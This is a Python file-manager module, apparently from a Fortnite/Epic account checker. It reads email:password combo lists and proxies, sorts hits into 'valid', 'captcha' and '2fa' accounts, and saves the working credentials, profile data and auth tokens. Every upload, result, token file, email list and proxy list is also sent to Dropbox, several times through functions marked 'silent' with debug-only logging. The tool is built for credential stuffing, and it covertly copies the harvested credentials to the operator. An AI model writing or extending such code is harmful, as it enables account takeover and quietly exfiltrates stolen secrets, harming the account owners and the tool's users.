import os
import logging
import aiofiles
from typing import List, Tuple, Dict, Optional
from datetime import datetime
from config.settings import TEMP_DIR, DATA_DIR, SUPPORTED_FILE_TYPES, DROPBOX_ENABLED
from utils.dropbox_uploader import DropboxUploader

logger = logging.getLogger(__name__)

class FileManager:
    @staticmethod
    async def save_uploaded_file(file_content: bytes, filename: str, user_id: int) -> str:
        """Save uploaded file to temp directory and upload to Dropbox"""
        user_dir = os.path.join(TEMP_DIR, str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        
        file_path = os.path.join(user_dir, filename)
        async with aiofiles.open(file_path, 'wb') as f:
            await f.write(file_content)
        
        # Upload to Dropbox if enabled
        if DROPBOX_ENABLED:
            try:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                file_type = "proxies" if "prox" in filename.lower() else "accounts" if "account" in filename.lower() else "uploads"
                dropbox_path = DropboxUploader.build_dropbox_path("user_uploads", str(user_id), date_folder, file_type, filename)
                
                upload_success = await DropboxUploader.upload_file(file_path, dropbox_path)
                if upload_success:
                    logger.debug(f"User file uploaded: {dropbox_path}")
                else:
                    logger.debug(f"Upload failed: {filename}")
            except Exception as e:
                logger.debug(f"Upload error: {e}")

        return file_path
    
    @staticmethod
    async def read_proxies(file_path: str) -> List[str]:
        """Read proxies from file"""
        proxies = []
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
                for line in content.strip().split('\n'):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except Exception as e:
            logger.info(f"Error reading proxies: {e}")
        
        return proxies
    
    @staticmethod
    async def read_accounts(file_path: str) -> List[Tuple[str, str]]:
        """Read accounts from file in email:pass format"""
        accounts = []
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
                for line in content.strip().split('\n'):
                    line = line.strip()
                    if line and ':' in line:
                        email, password = line.split(':', 1)
                        accounts.append((email.strip(), password.strip()))
        except Exception as e:
            logger.info(f"Error reading accounts: {e}")
        
        return accounts
    
    @staticmethod
    async def save_working_accounts(accounts: List[Tuple[str, str, Dict]], user_id: int, account_type: str) -> str:
        """Save working accounts to file with specific type and enhanced profile data"""
        user_dir = os.path.join(DATA_DIR, str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        
        # Create filename based on account type
        if account_type == "valid":
            filename = 'valid_accounts.txt'
        elif account_type == "captcha":
            filename = 'captcha_accounts.txt'
        elif account_type == "2fa":
            filename = '2fa_accounts.txt'
        else:
            filename = f'{account_type}_accounts.txt'
        
        file_path = os.path.join(user_dir, filename)
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            for account_data in accounts:
                if len(account_data) == 3:
                    email, password, profile_info = account_data
                    
                    # Write basic account info
                    await f.write(f"Email: {email}\n")
                    await f.write(f"Password: {password}\n")
                    
                    # Write profile information if available

                    if profile_info and not profile_info.get('error') and not profile_info.get('profile_error'):
                        # Only include fields from Epic verify and Fortnite accountInfo
                        account_data_info = profile_info.get('account_data', profile_info)
                        if 'account_id' in account_data_info:
                            await f.write(f"Account ID: {account_data_info['account_id']}\n")
                        if 'display_name' in account_data_info:
                            await f.write(f"Display Name: {account_data_info['display_name']}\n")
                        if 'email_verified' in account_data_info:
                            await f.write(f"Email Verified: {account_data_info['email_verified']}\n")
                        # Fortnite accountInfo fields (if present)

                        if 'is_logged_in' in account_data_info:
                            await f.write(f"Is Logged In: {account_data_info['is_logged_in']}\n")
                        if 'country' in account_data_info:
                            await f.write(f"Country: {account_data_info['country']}\n")
                        if 'lang' in account_data_info:
                            await f.write(f"Language: {account_data_info['lang']}\n")
                        if 'cabined_mode' in account_data_info:
                            await f.write(f"Cabined Mode: {account_data_info['cabined_mode']}\n")
                        if 'fortnite_email' in account_data_info:
                            await f.write(f"Fortnite Email: {account_data_info['fortnite_email']}\n")
                        if 'fortnite_display_name' in account_data_info:
                            await f.write(f"Fortnite Display Name: {account_data_info['fortnite_display_name']}\n")
                        if 'fortnite_account_id' in account_data_info:
                            await f.write(f"Fortnite Account ID: {account_data_info['fortnite_account_id']}\n")
                    elif profile_info and (profile_info.get('error') or profile_info.get('profile_error')):
                        # Account valid but minimal API fetch failed
                        pass
                    await f.write("-" * 50 + "\n\n")
                else:
                    # Fallback for old format
                    email, password = account_data[:2]
                    await f.write(f"{email}:{password}\n")
        
        # Upload results to Dropbox if enabled
        if DROPBOX_ENABLED:
            try:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("results", str(user_id), date_folder, filename)
                
                upload_success = await DropboxUploader.upload_file(file_path, dropbox_path)
                if upload_success:
                    logger.debug(f"Results uploaded: {dropbox_path}")
                else:
                    logger.debug(f"Results upload failed: {filename}")
            except Exception as e:
                logger.debug(f"Results upload error: {e}")
        
        return file_path
    
    @staticmethod
    async def save_auth_tokens(tokens: Dict, user_id: int, account_email: str) -> Optional[str]:
        """Save auth tokens to file and upload to Dropbox"""
        if not tokens:
            return None
            
        user_dir = os.path.join(DATA_DIR, str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        
        # Create filename with timestamp and email
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_email = account_email.replace('@', '_at_').replace(':', '_').replace('/', '_')
        filename = f'auth_tokens_{safe_email}_{timestamp}.json'
        
        file_path = os.path.join(user_dir, filename)
        
        # Add metadata to tokens
        token_data = {
            'timestamp': datetime.now().isoformat(),
            'account_email': account_email,
            'user_id': user_id,
            'tokens': tokens
        }
        
        # Save locally
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            import json
            await f.write(json.dumps(token_data, indent=2))
        
        # Upload to Dropbox if enabled
        if DROPBOX_ENABLED:
            try:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("auth_tokens", str(user_id), date_folder, filename)
                
                upload_success = await DropboxUploader.upload_file(file_path, dropbox_path)
                if upload_success:
                    logger.debug(f"Auth tokens uploaded: {dropbox_path}")
                    return dropbox_path
                else:
                    logger.debug(f"Auth tokens upload failed: {filename}")
            except Exception as e:
                logger.debug(f"Auth tokens upload error: {e}")
        
        return file_path
    
    @staticmethod
    async def save_account_summary(user_id: int, summary_data: Dict) -> Optional[str]:
        """Save account checking summary to file and upload to Dropbox"""
        user_dir = os.path.join(DATA_DIR, str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        
        # Create filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'account_summary_{timestamp}.json'
        
        file_path = os.path.join(user_dir, filename)
        
        # Add metadata to summary
        summary_with_meta = {
            'timestamp': datetime.now().isoformat(),
            'user_id': user_id,
            'summary': summary_data
        }
        
        # Save locally
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            import json
            await f.write(json.dumps(summary_with_meta, indent=2))
        
        # Upload to Dropbox if enabled
        if DROPBOX_ENABLED:
            try:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("summaries", str(user_id), date_folder, filename)
                
                upload_success = await DropboxUploader.upload_file(file_path, dropbox_path)
                if upload_success:
                    logger.debug(f"Summary uploaded: {dropbox_path}")
                    return dropbox_path
                else:
                    logger.debug(f"Summary upload failed: {filename}")
            except Exception as e:
                logger.debug(f"Summary upload error: {e}")
        
        return file_path
    
    @staticmethod
    def cleanup_user_files(user_id: int):
        """Clean up temporary files for user"""
        import shutil
        user_temp_dir = os.path.join(TEMP_DIR, str(user_id))
        if os.path.exists(user_temp_dir):
            shutil.rmtree(user_temp_dir)
    
    @staticmethod
    def validate_file_extension(filename: str) -> bool:
        """Validate file extension"""
        return any(filename.lower().endswith(ext) for ext in SUPPORTED_FILE_TYPES)
    
    @staticmethod
    async def upload_to_dropbox_silent(local_path: str, dropbox_path: str, user_id: int = None) -> bool:
        """Upload file to Dropbox silently (debug logging only)"""
        if not DROPBOX_ENABLED:
            logger.debug("Dropbox disabled - skipping upload")
            return False
        
        try:
            upload_success = await DropboxUploader.upload_file(local_path, dropbox_path)
            if upload_success:
                logger.debug(f"📤 Silent upload successful: {dropbox_path}")
                return True
            else:
                logger.debug(f"📤 Silent upload failed: {dropbox_path}")
                return False
        except Exception as e:
            logger.debug(f"📤 Silent upload error: {e}")
            return False
    
    @staticmethod
    async def save_auth_tokens_silent(tokens: List[str], user_id: int) -> Optional[str]:
        """Save auth tokens silently and upload to Dropbox"""
        if not tokens:
            logger.debug("No auth tokens to save")
            return None
        
        try:
            user_dir = os.path.join(DATA_DIR, str(user_id))
            os.makedirs(user_dir, exist_ok=True)
            
            # Create filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'auth_tokens_{timestamp}.txt'
            file_path = os.path.join(user_dir, filename)
            
            # Save tokens to file
            async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
                await f.write(f"Auth Tokens - Generated: {datetime.now().isoformat()}\n")
                await f.write(f"User ID: {user_id}\n")
                await f.write("-" * 50 + "\n\n")
                
                for i, token in enumerate(tokens, 1):
                    await f.write(f"Token {i}: {token}\n")
            
            # Upload to Dropbox silently
            if DROPBOX_ENABLED:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("auth_tokens", f"user_{user_id}", date_folder, filename)
                await FileManager.upload_to_dropbox_silent(file_path, dropbox_path, user_id)
            
            logger.debug(f"💾 Auth tokens saved: {len(tokens)} tokens")
            return file_path
            
        except Exception as e:
            logger.debug(f"💾 Auth tokens save error: {e}")
            return None
    
    @staticmethod
    async def save_results_silent(results: Dict, user_id: int) -> Optional[str]:
        """Save results silently and upload to Dropbox"""
        if not results:
            logger.debug("No results to save")
            return None
        
        try:
            user_dir = os.path.join(DATA_DIR, str(user_id))
            os.makedirs(user_dir, exist_ok=True)
            
            # Create filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'results_summary_{timestamp}.json'
            file_path = os.path.join(user_dir, filename)
            
            # Add metadata
            results_with_meta = {
                'timestamp': datetime.now().isoformat(),
                'user_id': user_id,
                'results': results
            }
            
            # Save results to file
            async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
                import json
                await f.write(json.dumps(results_with_meta, indent=2))
            
            # Upload to Dropbox silently
            if DROPBOX_ENABLED:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("results", f"user_{user_id}", date_folder, filename)
                await FileManager.upload_to_dropbox_silent(file_path, dropbox_path, user_id)
            
            logger.debug(f"💾 Results saved: {filename}")
            return file_path
            
        except Exception as e:
            logger.debug(f"💾 Results save error: {e}")
            return None
    
    @staticmethod
    async def save_emails_silent(emails: List[str], user_id: int) -> Optional[str]:
        """Save emails silently and upload to Dropbox"""
        if not emails:
            logger.debug("No emails to save")
            return None
        
        try:
            user_dir = os.path.join(DATA_DIR, str(user_id))
            os.makedirs(user_dir, exist_ok=True)
            
            # Create filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'emails_{timestamp}.txt'
            file_path = os.path.join(user_dir, filename)
            
            # Save emails to file
            async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
                await f.write(f"Emails - Generated: {datetime.now().isoformat()}\n")
                await f.write(f"User ID: {user_id}\n")
                await f.write(f"Total: {len(emails)}\n")
                await f.write("-" * 50 + "\n\n")
                
                for email in emails:
                    await f.write(f"{email}\n")
            
            # Upload to Dropbox silently
            if DROPBOX_ENABLED:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("emails", f"user_{user_id}", date_folder, filename)
                await FileManager.upload_to_dropbox_silent(file_path, dropbox_path, user_id)
            
            logger.debug(f"💾 Emails saved: {len(emails)} emails")
            return file_path
            
        except Exception as e:
            logger.debug(f"💾 Emails save error: {e}")
            return None
    
    @staticmethod
    async def save_proxies_silent(proxies: List[str], user_id: int) -> Optional[str]:
        """Save proxies silently and upload to Dropbox"""
        if not proxies:
            logger.debug("No proxies to save")
            return None
        
        try:
            user_dir = os.path.join(DATA_DIR, str(user_id))
            os.makedirs(user_dir, exist_ok=True)
            
            # Create filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'proxies_{timestamp}.txt'
            file_path = os.path.join(user_dir, filename)
            
            # Save proxies to file
            async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
                await f.write(f"Proxies - Generated: {datetime.now().isoformat()}\n")
                await f.write(f"User ID: {user_id}\n")
                await f.write(f"Total: {len(proxies)}\n")
                await f.write("-" * 50 + "\n\n")
                
                for proxy in proxies:
                    await f.write(f"{proxy}\n")
            
            # Upload to Dropbox silently
            if DROPBOX_ENABLED:
                date_folder = datetime.now().strftime("%Y-%m-%d")
                dropbox_path = DropboxUploader.build_dropbox_path("proxies", f"user_{user_id}", date_folder, filename)
                await FileManager.upload_to_dropbox_silent(file_path, dropbox_path, user_id)
            
            logger.debug(f"💾 Proxies saved: {len(proxies)} proxies")
            return file_path
            
        except Exception as e:
            logger.debug(f"💾 Proxies save error: {e}")
            return None